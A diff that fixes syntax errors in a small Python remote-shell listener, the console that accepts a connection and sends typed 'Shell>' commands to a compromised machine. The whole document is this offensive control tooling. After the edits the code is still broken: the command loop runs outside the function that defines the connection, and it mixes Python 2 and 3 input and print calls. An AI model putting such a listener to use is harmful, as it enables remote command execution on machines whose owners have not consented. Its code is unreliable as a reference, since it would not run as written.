@@ -1,4 +1,4 @@
-!#/usr/bin/env python3
+#!/usr/bin/env python3
 import socket
 
 def connect():
@@ -9,8 +9,7 @@ def connect():
     conn, addr = s.accept()
     print('[+] We got a connection from: ', addr)
 
-
-whie True:
+while True:
     command = raw_input('Shell> ')
     if 'terminate' in command:
         conn.send('terminate')
@@ -18,11 +17,9 @@ whie True:
         break
     else:
         conn.send(command)
-        print conn.recv(1024)
-
+        print(conn.recv(1024))
 
 def main ():
     connect()
-
 
 main()
